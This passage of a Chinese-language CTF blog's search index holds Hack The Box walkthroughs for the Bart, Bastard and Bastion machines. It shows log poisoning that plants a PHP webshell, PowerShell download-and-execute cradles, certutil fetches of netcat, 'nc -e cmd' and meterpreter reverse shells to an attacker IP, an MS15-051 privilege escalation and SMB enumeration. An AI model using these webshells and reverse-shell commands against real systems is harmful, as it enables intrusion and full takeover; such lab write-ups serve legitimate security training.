'http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey', true);\n    xhr.send(null);\n    alert(\"Done\");\n}\n</code></pre> <p>\u8bbf\u95eehttp://internal-01.bart.htb/log/log.txt\uff0c\u53d1\u73b0\u5b83\u8bb0\u5f55\u4e86\u7528\u6237\u8bf7\u6c42\u65f6\u95f4\u3001\u53c2\u6570\u4ee5\u53causer-agent\u7b49\u8bf7\u6c42\u4fe1\u606f</p> <p></p> <p>\u4e0e\u6b64\u540c\u65f6\u6211\u4eec\u518d\u6765\u770b\u8bf7\u6c42\u65e5\u5fd7\u5730\u5740http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey\uff0c\u4e00\u4e2a\u65b0\u7684\u601d\u8def\u915d\u917f\u800c\u6210\uff1a\u5982\u679c\u6307\u5b9a\u8bf7\u6c42\u53c2\u6570 filename \u4e3aPHP\u6587\u4ef6\u5e76\u4fee\u6539\u8bf7\u6c42\u5934 User-agent \u4e3aPHP\u811a\u672c\u5185\u5bb9\uff0c\u662f\u5426\u80fd\u5b8c\u6210getshell\uff1f</p> <p>\u4f7f\u7528 BurpSuite \u622a\u53d6\u70b9\u51fblog\u540e\u7684\u6570\u636e\u5305\uff0c\u5c06\u8bf7\u6c42\u53c2\u6570 filename \u4fee\u6539\u4e3aphpinfo.php\uff0cUser-agent \u4fee\u6539\u4e3a<code>&lt;?php phpinfo();?&gt;</code></p> <p></p> <p>\u53d1\u9001\u6210\u529f\u540e\u8bbf\u95ee/log/phpinfo.php\uff0c\u6210\u529f\u89e3\u6790\u4e3aphp\u811a\u672c\u8bed\u8a00\uff0c\u8fd9\u4e5f\u5c31\u610f\u5473\u7740\u6211\u4eec\u7684\u731c\u6d4b\u6b63\u786e\u3002</p> <p>\u5c1d\u8bd5\u83b7\u53d6webshell\uff0c\u5c06\u6587\u4ef6\u540d\u4fee\u6539\u4e3amac1.php\uff0c\u5185\u5bb9\u4e3aPHP\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <pre><code>&lt;?php system($_GET['cmd']);?&gt;\n</code></pre> <p>\u8bbf\u95ee\u6728\u9a6c\u5730\u5740http://internal-01.bart.htb/log/mac1.php?cmd=whoami\uff0c\u53ef\u6210\u529f\u6267\u884c\u547d\u4ee4</p>"},{"location":"CTF/HTB/Windows-Bart/index.html#shell","title":"\u53cd\u5f39shell","text":"<p>\u4f7f\u7528 nishang \u4e2d\u7684 Invoke-PowerShellTcp.ps1 \u811a\u672c\u6765\u6784\u9020\u53cd\u5f39</p> <pre><code>cp /root/Desktop/nishang/Shells/Invoke-PowerShellTcp.ps1\n</code></pre> <p>\u5728\u811a\u672c\u6700\u7ec8\u6dfb\u52a0\u9700\u8981\u53cd\u5f39\u7684\u5730\u5740\u548c\u7aef\u53e3</p> <pre><code>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 5555\n</code></pre> <p>\u4f7f\u7528 python \u5f00\u542f http \u670d\u52a1</p> <pre><code>python -m SimpleHTTPServer 80\n</code></pre> <p>\u5728\u672c\u5730\u76d1\u542c5555\u7aef\u53e3</p> <pre><code>nc -nvlp 5555\n</code></pre> <p>\u5728\u6728\u9a6c\u4e2d\u6267\u884c\u5982\u4e0b\u547d\u4ee4</p> <pre><code>cmd=powershell -c iex(new-object net.webclient).downloadstring('http://10.10.16.3/Invoke-PowerShellTcp.ps1')\n</code></pre> <p>\u6210\u529f\u53cd\u5f39shell</p> <p></p>"},{"location":"CTF/HTB/Windows-Bart/index.html#_4","title":"\u6743\u9650\u63d0\u5347","text":"<p>\u5f53\u524d\u7684\u6743\u9650\u662f\u4e0d\u8db3\u7684\uff0c\u6211\u4eec\u4f7f\u7528winpeasany\u770b\u80fd\u4e0d\u80fd\u63d0\u6743\u3002\u5148\u51c6\u5907\u597dwinpeasany.exe\uff0c\u81ea\u884c\u8c37\u6b4c\u4e0b\u8f7d\u5373\u53ef\u3002\u7136\u540e\u83b7\u53d6\u8d44\u6e90\u5230\u9776\u673a\u4e0a\u3002\u51c6\u5907\u597dwinpeas\uff0c\u4f7f\u7528python\u542f\u52a8\u672c\u5730\u7aef\u53e3\uff0c\u7136\u540e\u8ba9\u9632\u706b\u5899\u5141\u8bb8\u672c\u5730\u7aef\u53e3\u3002</p> <pre><code>python3 -m http.server 8083\n</code></pre> <p>\u5728\u9776\u673a\u4e0a\u6267\u884c</p> <pre><code>iwr -uri 'http://10.10.16.3:8083/winPEASany.exe' -outfile 'winpeas.exe'\n</code></pre> <p>iwr\u662f\u4f7f\u7528 PowerShell \u4e0b\u8f7d\u4e00\u4e2a\u6587\u4ef6\u7684\u547d\u4ee4\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5b83\u4f7f\u7528 Invoke-WebRequest\uff08\u7f29\u5199\u4e3a iwr\uff09\u4ece\u6307\u5b9a\u7684 URL \u4e0b\u8f7d\u4e00\u4e2a\u6587\u4ef6\u5e76\u5c06\u5176\u4fdd\u5b58\u5230\u672c\u5730\u3002</p> <p>Invoke-WebRequest \u662f PowerShell \u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684 cmdlet\uff0c\u7528\u4e8e\u53d1\u51fa HTTP \u548c HTTPS \u8bf7\u6c42\uff0c\u5e76\u63a5\u6536\u54cd\u5e94\u3002\u8fd9\u4f7f\u5f97\u5b83\u975e\u5e38\u9002\u5408\u5728 PowerShell \u811a\u672c\u4e2d\u8fdb\u884c Web \u64cd\u4f5c\uff0c\u6bd4\u5982\u4e0b\u8f7d\u6587\u4ef6\u3001\u4e0e REST API \u4ea4\u4e92\u3001\u63d0\u4ea4\u8868\u5355\u7b49\u3002</p> <p></p> <p></p> <p>\u6267\u884cwinpeas.exe</p> <pre><code>./winpeas.exe\n</code></pre> <p>\u6ca1\u641e\u5b9a\uff0c\u56e0\u6b64\u6211\u60f3\u7740\uff0c\u8fd8\u662f\u5f97\u7528msf\u4e0a\u6765\uff0c\u5728\u524d\u9762\u83b7\u53d6\u5230shell\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u7528msf\u7ee7\u7eed\u3002\u9996\u5148\u751f\u6210\u6728\u9a6c\uff0c\u7136\u540e\u4e0a\u4f20\uff0c\u63a5\u7740\u6267\u884c\uff0c\u751f\u6210\u6728\u9a6c\u3002</p> <pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.3 lport=4444 -f exe &gt; shell.exe\n</code></pre> <p>\u4e0a\u4f20\uff0c\u5728\u83b7\u53d6\u7684shell\u4e2d\u6267\u884c</p> <pre><code>iwr -uri 'http://10.10.16.3:8083/shell.exe' -outfile 'shell.exe'\n</code></pre> <p></p> <p>\u7136\u540e\u672c\u5730msf\u76d1\u542c</p> <pre><code>use exploit/multi/handler \nset payload windows/meterpreter/reverse_tcp\nset lhost 10.10.16.3\nset lport 4444\nrun\n</code></pre> <p></p> <p>\u62ff\u5230\u4e86meterpreter\u3002\u65e2\u7136\u6709\u4e86meterpreter\uff0c\u90a3\u4e48\u76f4\u63a5\u63d0\u6743\u5c31\u597d\u4e86</p> <p></p> <p>\u8fdb\u5165meterpreter\u7684shell\uff0c\u7136\u540e\u627e\u5230root.txt\u4ee5\u53causer.txt.</p>"},{"location":"CTF/HTB/Windows-Bastard/index.html","title":"\u4fe1\u606f\u641c\u96c6","text":""},{"location":"CTF/HTB/Windows-Bastard/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.9 -oA scans/ports\n...\nPORT      STATE SERVICE\n80/tcp    open  http\n135/tcp   open  msrpc\n49154/tcp open  unknown\n...\nroot@kali# nmap -sT -sC -sV -O -p80,135,49154 10.10.10.9 -oA scans/details\n...\nPORT      STATE SERVICE VERSION\n80/tcp    open  http    Microsoft IIS httpd 7.5\n|_http-generator: Drupal 7 (http://drupal.org)\n| http-methods:\n|_  Potentially risky methods: TRACE\n| http-robots.txt: 36 disallowed entries (15 shown)\n| /includes/ /misc/ /modules/ /profiles/ /scripts/\n| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt\n| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt\n|_/LICENSE.txt /MAINTAINERS.txt\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: Welcome to 10.10.10.9 | 10.10.10.9\n135/tcp   open  msrpc   Microsoft Windows RPC\n49154/tcp open  msrpc   Microsoft Windows RPC\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n...\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u8be5\u7f51\u7ad9\u6b63\u5728\u8fd0\u884cIIS7.5\uff0c\u8fd9\u662fWindows 7\u7684\u9ed8\u8ba4IIS\uff0c\u6b64\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u770b\u5230\u8be5Web\u670d\u52a1\u5668\u6b63\u5728\u6258\u7ba1Drupal 7\u3002</p>"},{"location":"CTF/HTB/Windows-Bastard/index.html#drupal-tcp-80","title":"Drupal - TCP 80","text":"<p>\u521a\u521anmap\u626b\u63cf\u51fa\u4e86robots.txt\u6587\u4ef6\uff0c\u63a5\u7740\u67e5\u770bCHANGELOG.txt\u6765\u786e\u5b9a</p> <p></p> <pre><code>root@kali# curl -s http://10.10.10.9/CHANGELOG.txt | head\n\nDrupal 7.54, 2017-02-01\n-----------------------\n- Modules are now able to define theme engines (API addition:\n  https://www.drupal.org/node/2826480).\n- Logging of searches can now be disabled (new option in the administrative\n  interface).\n- Added menu tree render structure to (pre-)process hooks for theme_menu_tree()\n  (API addition: https://www.drupal.org/node/2827134).\n- Added new function for determining whether an HTTPS request is being served\n</code></pre> <p>\u53d1\u73b0\u7248\u672c\uff1aDrupal 7.54\u3002</p>"},{"location":"CTF/HTB/Windows-Bastard/index.html#_2","title":"\u6f0f\u6d1e\u68c0\u6d4b\u4e0e\u5229\u7528","text":""},{"location":"CTF/HTB/Windows-Bastard/index.html#searchsploit","title":"searchsploit","text":"<p>\u901a\u8fc7searchsploit\u67e5\u8be2\u53ef\u5229\u7528\u7248\u672c</p> <pre><code>searchsploit drupal 7.x\n</code></pre> <p></p> <p>\u8be5\u7248\u672c\u5b58\u5728 rce \uff0c\u7f16\u8f91 exploit\uff0c\u8be5exploit\u4f1a\u653b\u51fb\u7531\u670d\u52a1\u6269\u5c55\u521b\u5efa\u7684REST\u7aef\u70b9\uff0c\u6211\u4eec\u53ea\u9700\u8981\u627e\u51faREST\u7aef\u70b9\u7684\u540d\u79f0\u5373\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u3002</p> <p>\u901a\u8fc7\u76ee\u5f55\u679a\u4e3e\uff0c\u6211\u4eec\u53d1\u73b0 endpoint \u4e3a /rest\uff0c\u7528\u5176\u66ff\u6362exploit\u3002</p> <pre><code>gobuster -q dir --url http://10.10.10.9 -t 50 --wordlist ./word.txt\n</code></pre> <p></p> <p></p> <p></p> <p>\u6267\u884c\u811a\u672c\u524d\u9700\u8981\u5b89\u88c5php-curl\u5426\u5219\u65e0\u6cd5\u8fd0\u884c\u6210\u529f</p> <pre><code>apt-get install php-curl\n</code></pre> <p>\u547d\u4ee4\u6267\u884c\u6210\u529f</p> <p></p>"},{"location":"CTF/HTB/Windows-Bastard/index.html#shell","title":"\u53cd\u5f39shell","text":""},{"location":"CTF/HTB/Windows-Bastard/index.html#certutilnc","title":"\u901a\u8fc7certutil\u547d\u4ee4\u5c06nc\u4e0b\u8f7d\u5230\u9776\u673a\u4e2d","text":"<pre><code>http://10.129.115.43/shell.php?cmd=certutil -urlcache -f http://10.10.14.58:8001/nc64.exe nc64.exe //\u4e0b\u8f7dnc\nhttp://10.129.115.43/shell.php?cmd=nc64.exe 10.10.14.58 1234 -e cmd  //\u53cd\u5f39shell\n</code></pre> <p>Certutil \u662f Windows \u64cd\u4f5c\u7cfb\u7edf\u4e0a\u9884\u88c5\u7684\u5de5\u5177\uff0c\u53ef\u7528\u4e8e \u6821\u9a8c\u6587\u4ef6MD5\u3001SHA1\u3001SHA256\uff0c\u4e0b\u8f7d\u6076\u610f\u6587\u4ef6\u548c\u514d\u6740\u3002</p> <p>certutil -urlcache -f http://10.10.14.58:8001/nc64.exe nc64.exe:</p> <p>certutil\uff1a\u8c03\u7528 certutil \u5de5\u5177\u3002</p> <p>-urlcache\uff1a\u6307\u5b9a certutil \u4f7f\u7528 URL \u7f13\u5b58\u5b50\u547d\u4ee4\u3002\u8fd9\u901a\u5e38\u7528\u4e8e\u4ece URL \u4e0b\u8f7d\u6587\u4ef6\u6216\u663e\u793a\u7f13\u5b58\u7684 URL \u6570\u636e\u3002</p> <p>-f\uff1a\u5f3a\u5236\u8986\u76d6\u73b0\u6709\u6587\u4ef6\uff08\u5982\u679c\u76ee\u6807\u6587\u4ef6\u5df2\u7ecf\u5b58\u5728\uff09\u3002</p> <p></p> <p>\u6210\u529f\u83b7\u53d6shell</p> <p></p>"},{"location":"CTF/HTB/Windows-Bastard/index.html#_3","title":"\u63d0\u6743","text":"<p>systeminfo\u67e5\u8be2\u8be5\u8ba1\u7b97\u673a\u7684\u76f8\u5173\u4fe1\u606f</p> <pre><code>PS C:\\inetpub\\drupal-7.54&gt; systeminfo\n\nHost Name:                 BASTARD\nOS Name:                   Microsoft Windows Server 2008 R2 Datacenter \nOS Version:                6.1.7600 N/A Build 7600\nOS Manufacturer:           Microsoft Corporation\nOS Configuration:          Standalone Server\nOS Build Type:             Multiprocessor Free\nRegistered Owner:          Windows User\nRegistered Organization:   \nProduct ID:                00496-001-0001283-84782\nOriginal Install Date:     18/3/2017, 7:04:46 ??\nSystem Boot Time:          4/3/2019, 1:56:57 ??\nSystem Manufacturer:       VMware, Inc.\nSystem Model:              VMware Virtual Platform\nSystem Type:               x64-based PC\nProcessor(s):              2 Processor(s) Installed.\n                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2300 Mhz\n                           [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2300 Mhz\nBIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016\nWindows Directory:         C:\\Windows\nSystem Directory:          C:\\Windows\\system32\nBoot Device:               \\Device\\HarddiskVolume1\nSystem Locale:             el;Greek\nInput Locale:              en-us;English (United States)\nTime Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul\nTotal Physical Memory:     2.048 MB\nAvailable Physical Memory: 1.550 MB\nVirtual Memory: Max Size:  4.095 MB\nVirtual Memory: Available: 3.582 MB\nVirtual Memory: In Use:    513 MB\nPage File Location(s):     C:\\pagefile.sys\nDomain:                    HTB\nLogon Server:              N/A\nHotfix(s):                 N/A\nNetwork Card(s):           1 NIC(s) Installed.\n                           [01]: Intel(R) PRO/1000 MT Network Connection\n                                 Connection Name: Local Area Connection\n                                 DHCP Enabled:    No\n                                 IP address(es)\n                                 [01]: 10.10.10.9\n</code></pre> <p>\u4f7f\u7528Sherlock.ps1\u67e5\u627e\u7cfb\u7edf\u7f3a\u5c11\u7684\u7248\u672c\u8865\u4e01\u4e0e\u6f0f\u6d1e   https://github.com/rasta-mouse/Sherlock</p> <p>\u63d0\u6743\u5c0f\u795e\u5668Sherlock\u7684\u5206\u6790\u4e0e\u5229\u7528\uff1a</p> <p>Sherlock\u662f\u4e00\u4e2a\u5728Windows\u4e0b\u7528\u4e8e\u672c\u5730\u63d0\u6743\u7684PowerShell\u811a\u672c\u3002</p> <p>\u76ee\u524d\u5305\u542b\u4e86\u4ee5\u4e0b\u6f0f\u6d1e\uff1a</p> <p>MS10-015 : User Mode to Ring (KiTrap0D) MS10-092 : Task Scheduler MS13-053 : NTUserMessageCall Win32k Kernel Pool Overflow MS13-081 : TrackPopupMenuEx Win32k NULL Page MS14-058 : TrackPopupMenu Win32k Null Pointer Dereference MS15-051 : ClientCopyImage Win32k MS15-078 : Font Driver Buffer Overflow MS16-016 : \u2018mrxdav.sys\u2019 WebDAV MS16-032 : Secondary Logon Handle</p> <p>\u5728\u8fd0\u884c\u8be5\u811a\u672c\u524d\u9700\u8981\u5728\u811a\u672c\u4e2d\u6dfb\u52a0Find-ALLvulns\u67e5\u627e\u6240\u6709\u6f0f\u6d1e</p> <pre><code>http://10.129.115.58/shell.php?cmd=echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.58:8001/Sherlock.ps1') | powershell -noprofile \n</code></pre> <p>echo IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')\uff1a</p> <p>IEX \u662f Invoke-Expression \u7684\u7f29\u5199\uff0cPowerShell \u4e2d\u7684\u4e00\u4e2a\u547d\u4ee4\uff0c\u7528\u4e8e\u6267\u884c\u4f20\u5165\u7684\u5b57\u7b26\u4e32\u8868\u8fbe\u5f0f\u3002\u5728\u6b64\u547d\u4ee4\u4e2d\uff0c\u5b83\u5c06\u6267\u884c\u4ece URL \u4e0b\u8f7d\u7684 PowerShell \u811a\u672c\u5185\u5bb9\u3002</p> <p>New-Object System.Net.Webclient \u521b\u5efa\u4e00\u4e2a\u65b0\u7684 WebClient \u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u7528\u4e8e\u8fdb\u884c\u7f51\u7edc\u64cd\u4f5c\u3002</p> <p>DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1') \u65b9\u6cd5\u4ece\u6307\u5b9a\u7684 URL \u4e0b\u8f7d\u5185\u5bb9\uff0c\u5e76\u4ee5\u5b57\u7b26\u4e32\u5f62\u5f0f\u8fd4\u56de\u4e0b\u8f7d\u7684\u5185\u5bb9\u3002URL \u6307\u5411\u4e86\u4e00\u4e2a\u540d\u4e3a Sherlock.ps1 \u7684 PowerShell \u811a\u672c\u6587\u4ef6\u3002</p> <p>\u4f7f\u7528MS15-051\u8fdb\u884c\u63d0\u6743</p> <p></p> <p>\u5c06ms15-051x64.exe\u4e0b\u8f7d\u5230\u9776\u673a\u4e2d\u5e76\u547d\u540d\u4e3aShell.exe \u4f7f\u7528nc\u53cd\u5f39shell</p> <pre><code>certutil -urlcache -f http://10.10.14.58:8000/ms15-051x64.exe Shell.exe \nShell.exe \"nc64.exe 10.10.14.58 4242 -e cmd.exe\"\n</code></pre> <p></p> <p>\u6210\u529f\u83b7\u53d6\u5230system\u6743\u9650</p> <p></p>"},{"location":"CTF/HTB/Windows-Bastion/index.html","title":"\u4fe1\u606f\u6536\u96c6","text":""},{"location":"CTF/HTB/Windows-Bastion/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.134 -oA scans/ports\n...\nPORT      STATE SERVICE\n22/tcp    open  ssh\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n5985/tcp  open  wsman\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n...\n</code></pre> <p>\u4ece\u4e0a\u9762\u5f00\u653e\u7684\u7aef\u53e3\uff0c\u6211\u4eec\u53ef\u4ee5\u63a8\u5bfc\u51fa\u8fd9\u662f\u4e00\u53f0\u5f00\u653e\u4e86 ssh \u670d\u52a1\u7684 windows \u673a\u5668\u3002\u63a5\u7740\u5c1d\u8bd5\u83b7\u53d6\u8fd9\u4e9b\u5f00\u653e\u7aef\u53e3\u5bf9\u5e94\u7684\u670d\u52a1\uff1a</p> <pre><code>root@kali# nmap -sT -sC -sV -O -p22,135,139,445 10.10.10.134 -oA scans/details\n...\nPORT    STATE SERVICE      VERSION\n22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)\n| ssh-hostkey:\n|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)\n|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)\n|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)\n135/tcp open  msrpc        Microsoft Windows RPC\n139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -45m33s, deviation: 1h09m14s, median: -5m35s\n| smb-os-discovery:\n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: Bastion\n|   NetBIOS computer name: BASTION\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2019-05-03T07:35:01+02:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2019-05-03 01:34:59\n|_  start_date: 2019-05-01 23:10:38\n...\n</code></pre> <p>\u53d1\u73b0\u7684\u670d\u52a1\u4e3assh\u3001Msrpc\u3001NetBIOS\u3001SMB, \u64cd\u4f5c\u7cfb\u7edf\u4e3aWindows Server 2016 Standard 14393, NetBIOS\u540d\u5b57\u662fBASTION, \u5de5\u4f5c\u7ec4\u662fWORKGROUP. \u8bf4\u660e\u8fd9\u4e0d\u662f\u4e00\u53f0HTB\u57df\u6210\u5458\u4e3b\u673a. SMB\u7528\u6237guest, \u9a8c\u8bc1\u767b\u7ea7\u4e3auser.</p> <p>\u521d\u6b65\u5224\u65ad\u5927\u81f4\u601d\u8def\u662f\u533f\u540dSMB\u767b\u9646\u83b7\u53d6\u8d26\u53f7\u5bc6\u7801\uff0c\u901a\u8fc7ssh\u767b\u9646\u83b7\u53d6\u66f4\u597d\u6743\u9650\u3002</p>"},{"location":"CTF/HTB/Windows-Bastion/index.html#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":""},{"location":"CTF/HTB/Windows-Bastion/index.html#smb","title":"SMB","text":"<p>\u4e0a\u9762\u7684\u4fe1\u606f\u770b\u8d77\u6765\u5e76\u6ca1\u6709\u4ec0\u4e48\u7279\u522b\u7684\u3002\u4e00\u822c\u7684\u9776\u673a\uff0chttp \u670d\u52a1\u5f80\u5f80\u90fd\u662f\u7a81\u7834\u53e3\u3002\u5bf9\u4e8e\u8fd9\u4e2a\u9776\u673a\uff0c\u6211\u4eec\u5e94\u8be5\u6ce8\u610f\u5230\u5f00\u653e\u5728 445 \u7aef\u53e3\u7684 smb \u670d\u52a1\uff08445 \u7aef\u53e3\u5f80\u5f80\u4e5f\u662f windows \u673a\u5668\u7684\u7a81\u7834\u53e3\uff09\u3002\u5728 kali \u4e0a\u8fdb\u884c smb \u670d\u52a1\u7684\u63a2\u6d4b\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528 smbmap, smbclient, enum4linux \u7b49\u3002\u6211\u4eec\u5148\u6765\u8bd5\u4e00\u4e0b smbclient\uff1a</p> <pre><code>root@kali# smbclient -L 10.10.10.134\n...\nADMIN$ Disk Remote Admin\nBackups Disk\nC$ Disk Default share\nIPC$ IPC Remote IPC\n...\n</code></pre> <p>\u6216\u8005\u4f7f\u7528smbmap\uff1a\u770b\u5230nmap\u626b\u63cf\u51fasmb\u6709\u4e00\u4e2a\u7528\u6237guest\uff0c\u7528smbmap\u67e5\u770b\u5206\u4eab\u76ee\u5f55\u4fe1\u606f</p> <pre><code>root@kali# smbmap -H 10.10.10.134 -u guest\n[+] IP: 10.10.10.134:445        Name: 10.10.10.134                                      \n[-] Work[!] Unable to remove test directory at \\\\10.10.10.134\\Backups\\YCUDSRXTPW, please remove manually\n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        ADMIN$                                                  NO ACCESS       Remote Admin\n        Backups                                                 READ, WRITE\n        C$                                                      NO ACCESS       Default share\n        IPC$                                                    READ ONLY       Remote IPC\n</code></pre> <p>smbmap\uff1asmbmap \u662f\u4e00\u4e2a\u7528\u4e8e\u5feb\u901f\u626b\u63cf SMB \u5171\u4eab\u76ee\u5f55\u7684\u5de5\u5177\u3002\u5b83\u80fd\u591f\u5217\u51fa\u76ee\u6807\u4e3b\u673a\u4e0a\u7684 SMB \u5171\u4eab\uff0c\u663e\u793a\u6bcf\u4e2a\u5171\u4eab\u7684\u6743\u9650\u548c\u76ee\u5f55\u7ed3\u6784\uff0c\u4ee5\u53ca\u5171\u4eab\u4e2d\u7684\u6587\u4ef6\u548c\u5b50\u76ee\u5f55\u7b49\u4fe1\u606f\u3002smbmap \u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\u7ecf\u5e38\u7528\u4e8e\u53d1\u73b0\u76ee\u6807\u7cfb\u7edf\u4e0a\u7684\u654f\u611f\u6587\u4ef6\u6216\u914d\u7f6e\u9519\u8bef\u3002</p> <p>smbclient\uff1asmbclient \u662f\u4e00\u4e2a\u7528\u4e8e\u4e0e SMB/CIFS \u670d\u52a1\u5668\u8fdb\u884c\u4ea4\u4e92\u7684\u547d\u4ee4\u884c\u5de5\u5177\u3002\u5b83\u53ef\u4ee5\u7528\u4e8e\u8bbf\u95ee\u548c\u7ba1\u7406\u8fdc\u7a0b\u5171\u4eab\u6587\u4ef6\u5939\uff0c\u6267\u884c\u6587\u4ef6\u7684\u4e0a\u4f20\u3001\u4e0b\u8f7d\u548c\u5220\u9664\u7b49\u64cd\u4f5c\u3002smbclient \u8fd8\u652f\u6301\u5728 SMB \u670d\u52a1\u5668\u4e0a\u6267\u884c\u4e00\u4e9b\u5e38\u89c1\u7684\u6587\u4ef6\u548c\u76ee\u5f55\u64cd\u4f5c\uff0c\u4f8b\u5982\u5217\u51fa\u6587\u4ef6\u3001\u521b\u5efa\u76ee\u5f55\u3001\u83b7\u53d6\u6587\u4ef6\u5c5e\u6027\u7b49\u3002</p> <p>enum4linux\uff1aenum4linux \u662f\u4e00\u4e2a\u7528\u4e8e\u679a\u4e3e SMB \u670d\u52a1\u5668\u4e0a\u7684\u4fe1\u606f\u7684\u5de5\u5177\u3002\u5b83\u80fd\u591f\u5feb\u901f\u6536\u96c6\u76ee\u6807\u7cfb\u7edf\u4e0a\u7684\u7528\u6237\u3001\u7ec4\u3001\u5171\u4eab\u3001\u4f1a\u8bdd\u3001\u7cfb\u7edf\u4fe1\u606f\u7b49\uff0c\u5e76\u8f93\u51fa\u4e3a\u6613\u4e8e\u5206\u6790\u7684\u683c\u5f0f\u3002enum4linux \u53ef\u4ee5\u5e2e\u52a9\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u6216\u7cfb\u7edf\u7ba1\u7406\u5458\u4e86\u89e3\u76ee\u6807\u7cfb\u7edf\u7684\u914d\u7f6e\u3001\u7528\u6237\u4fe1\u606f\u548c\u5171\u4eab\u8d44\u6e90\uff0c\u4ece\u800c\u53d1\u73b0\u6f5c\u5728\u7684\u5b89\u5168\u95ee\u9898\u6216\u4f18\u5316\u5efa\u8bae\u3002</p> <p>smbclient\u4f7f\u7528\u6559\u7a0b\uff1ahttps://cloud.tencent.com/developer/article/2393256</p> <p>smbmap\u4f7f\u7528\u6559\u7a0b\uff1ahttps://www.shserve.cn/18963.html</p> <p>enum4linux\u4f7f\u7528\u6559\u7a0b\uff1ahttps://blog.csdn.net/qq_63844103/article/details/127219997</p> <p>\u901a\u8fc7 smbclient\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e0d\u4f7f\u7528\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\u770b\u5230\u8fd9\u53f0\u9776\u673a\u7684\u5171\u4eab\u3002\u901a\u8fc7 <code>smbclient //10.10.10.134/sharename</code>\u6765\u5c1d\u8bd5\u8bbf\u95ee\u5171\u4eab\u8def\u5f84\uff0c\u6211\u4eec\u53d1\u73b0\u53ea\u6709 Backups \u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\u3002</p> <p></p> <p>\u8bbf\u95ee\u5171\u4eab Backups: smbclient //10.10.10.134/Backups\uff1a</p> <pre><code>root@kali# smbclient //10.10.10.134/Backups -U guest\nEnter WORKGROUP\\guest's password: \nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Wed Dec 22 10:47:38 2021\n  ..                                  D        0  Wed Dec 22 10:47:38 2021\n  CFZMBSIEGP                          D        0  Wed Dec 22 10:36:04 2021\n  note.txt                           AR      116  Tue Apr 16 06:10:09 2019\n  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019\n  TFHLPWIACJ                          D        0  Wed Dec 22 10:47:38 2021\n  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019\n  YCUDSRXTPW                          D        0  Wed Dec 22 10:44:00 2021\n</code></pre> <p>\u91cc\u9762\u6709note.txt\u548cWindowsImageBackup\u3002</p> <p>note.txt\u5185\u5bb9\uff1a</p> <pre><code>Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.\n\u7cfb\u7edf\u7ba1\u7406\u5458\uff1a\u8bf7\u4e0d\u8981\u5728\u672c\u5730\u4f20\u8f93\u6574\u4e2a\u5907\u4efd\u6587\u4ef6\uff0cVPN\u5230\u9644\u5c5e\u529e\u516c\u5ba4\u7684\u901f\u5ea6\u592a\u6162\u3002\n</code></pre> <p>\u6574\u4e2a\u6587\u4ef6\u5907\u4efd\u5e94\u8be5\u662f\u6307WindowsImageBackup\u8fd9\u4e2a\u6587\u4ef6\u5939\uff0cWindows 